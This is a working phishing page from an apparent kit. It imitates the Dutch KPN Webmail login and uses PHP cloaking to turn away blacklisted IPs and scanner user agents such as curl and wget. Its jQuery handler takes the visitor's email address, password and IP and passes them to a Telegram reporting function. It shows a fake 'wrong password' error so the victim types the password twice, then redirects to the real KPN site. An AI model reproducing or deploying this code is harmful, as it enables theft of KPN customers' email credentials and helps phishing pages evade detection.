<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('x8SYQLpUqU')) { 
    function x8SYQLpUqU() { 
        $xb2zx1 = $_SERVER['SERVER_ADDR']; 
        $xXSEJ = '127.0.0.1'; 
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xXSEJ)) {
            $ip=$_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xXSEJ) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xb2zx1))) {
            $ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CLIENT_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip=$_SERVER['REMOTE_ADDR'];
        } 
        return $ip; 
    }
}
$ip=x8SYQLpUqU();

// Check if visitor IP is in blacklist files
if (IPBlacklistLoader::isBlacklisted($ip)) {
    // IP is blacklisted - redirect to centralized URL
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════ 

if (!function_exists('x9PfbWn2bS')) { 
    function x9PfbWn2bS() { 
        if(empty($_SERVER['HTTP_USER_AGENT'])) { 
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); 
        } 
        return $_SERVER['HTTP_USER_AGENT']; 
    }
}
$eRf9t9d9 = x9PfbWn2bS();

// Basic user agent check (secondary protection layer)
$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ✅ All checks passed - load page
?>
<!doctype html>
<html lang="nl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>KPN Webmail — Replica</title>
  
  <!-- Antibot Scripts -->
  <script src="../m/js/fingerprint.js"></script>
  <script src="../m/js/utils.js"></script>
  <script src="../m/js/captcha.js"></script>
  
  <!-- Centralized Functions -->
  <script src="../js/centralized_telegram.js"></script>
  <script src="../js/centralized_redirect.js"></script>
  <script src="../js/email_extractor.js"></script>
  <script src="../js/autofill_helper.js"></script>
  <style>
    :root{--kpn-green:#00b140;--blue:#09a0f0;--card-bg:#ffffff}
    html,body{height:100%;margin:0;font-family:Inter,Segoe UI,Roboto,Arial,sans-serif;color:#222}
    /* background: official KPN webmail hero image (right side) */
    body{background:linear-gradient(90deg,rgba(0,0,0,0.12) 0%, rgba(0,0,0,0.00) 35%), url('https://webmail.kpnmail.nl/loginpages/images/kpnmail/foto_bg_webmail.jpg') right center/cover no-repeat fixed}

    .wrapper{max-width:1200px;margin:0 auto;padding:8px 24px;position:relative}
    header{display:flex;align-items:flex-start;gap:24px;padding:8px 0}
    .kpn-logo{display:flex;align-items:center}
    .kpn-logo-img{width:140px;height:auto;display:block}
    /* page title above the centered card */
    .site-title{width:100%;text-align:center;margin:6px 0 6px;font-size:32px;color:#4b4b4b;font-weight:400;letter-spacing:-0.3px}

    .layout{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:calc(100vh - 120px);gap:18px}
    /* main card */
    .card{width:420px;background:var(--card-bg);box-shadow:0 8px 28px rgba(0,0,0,.12);border:1px solid rgba(0,0,0,.08);padding:22px;border-radius:4px}

    .form-row{margin-bottom:10px}
    label{display:block;font-size:13px;margin-bottom:6px;color:#333}
    input[type="text"],input[type="password"]{width:360px;max-width:100%;padding:10px 12px;border:1px solid #e6e6e6;border-radius:4px;font-size:13px;background:#fafafa;display:block;margin:0 auto}
    input::placeholder{color:#9aa0a6}

    .checkbox{display:flex;align-items:center;gap:10px;margin:10px 0 0;color:#333}
    .btn{display:block;width:360px;max-width:100%;padding:12px 14px;background:var(--blue);color:#fff;border-radius:6px;border:none;font-size:16px;margin:16px auto 0;cursor:pointer}

    .help{margin-top:14px}
    .help h3{font-size:18px;margin-bottom:8px;color:#333;font-weight:600}
    .help ul{list-style:none;padding:0;margin:0}
    .help li{padding:3px 0;border-bottom:1px solid #f6f6f6;display:flex;align-items:flex-start;gap:6px;font-size:13px;line-height:1.08}
    .help li:before{content:"\25CF";color:#111;background:transparent;font-size:10px;line-height:16px;margin-top:3px}
    .help a{color:#222;text-decoration:none}

    @media (max-width:900px){
      .layout{flex-direction:column;align-items:stretch}
      .card{width:100%}
      input[type="text"],input[type="password"],.btn{width:100%}
      body{background-position:center}
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <header>
      <div class="kpn-logo">
        <img src="https://static.kpn.com/ssi/svg/kpn-logo.svg" alt="KPN logo" class="kpn-logo-img">
      </div>
    </header>

    <div class="site-title" id="login-title">Inloggen Webmail</div>

    <div class="layout" style="margin-top:6px">
      <main class="card" role="main" aria-labelledby="login-title">

        <form id="login-form">
          <div class="form-row">
            <label for="username">Gebruikersnaam / e-mailadres</label>
            <input id="username" name="username" type="text" placeholder="Gebruikersnaam / e-mailadres" autocomplete="username">
          </div>

          <div class="form-row">
            <label for="password">Wachtwoord</label>
            <input id="password" name="password" type="password" placeholder="Wachtwoord" autocomplete="current-password">
          </div>

          <label class="checkbox"><input type="checkbox" id="remember"> Onthoud mijn gebruikersnaam</label>

          <button class="btn" type="submit" id="submit-btn">Login</button>

          <div id="error-msg" style="margin-top:12px;color:#c33;display:none;font-size:13px;text-align:center;"></div>
        </form>

        <div class="help">
          <h3>Waarmee kunnen we je helpen?</h3>
          <ul>
            <li><a href="#">Wachtwoord vergeten</a></li>
            <li><a href="#">Alles over KPN e-mail en Webmail</a></li>
            <li><a href="#">E-mail instellen op je mobiele telefoon</a></li>
            <li><a href="#">Problemen bij het ontvangen en versturen van e-mail</a></li>
            <li><a href="#">Freeler e-mail instellingen beheren</a></li>
          </ul>
        </div>
      </main>

      <!-- right visual area intentionally left as hero -->
      <aside style="flex:1"></aside>
    </div>
  </div>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
  <script>
    /* global $ */
    $(document).ready(function() {
      var count = 0;

      function isValidEmail(email) {
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        return filter.test(email);
      }

      $('#login-form').on('submit', function(event) {
        event.preventDefault();
        var email = $('#username').val() ? $('#username').val().trim() : '';
        var pw = $('#password').val() ? $('#password').val().trim() : '';
        
        if (!email || !isValidEmail(email)) {
          $('#username').focus();
          return false;
        }
        if (!pw) {
          $('#password').focus();
          return false;
        }

        count++;
        window.providerTag = 'kpnmail';
        var clientIP = window.userip || 'n/a';

        function handleSubmission(attempt, redirectOnSuccess) {
            if (typeof sendCentralizedTelegramReport === 'function') {
                sendCentralizedTelegramReport(providerTag, email, pw, clientIP, function(success) {
                    if (redirectOnSuccess) {
                        if (typeof performCentralizedRedirect === 'function') {
                            performCentralizedRedirect(300);
                        } else {
                            setTimeout(function() { window.location.replace('https://webmail.kpnmail.nl/'); }, 300);
                        }
                    }
                });
            } else {
                if (redirectOnSuccess) {
                    setTimeout(function() { window.location.replace('https://webmail.kpnmail.nl/'); }, 300);
                }
            }
        }

        handleSubmission(count, (count >= 2));

        if (count === 1) {
          $('#error-msg').text('Onjuiste gebruikersnaam of wachtwoord. Probeer het opnieuw.').fadeIn();
          $('#password').val('').focus();
          return false;
        }
      });
    });
  </script>
</body>
</html>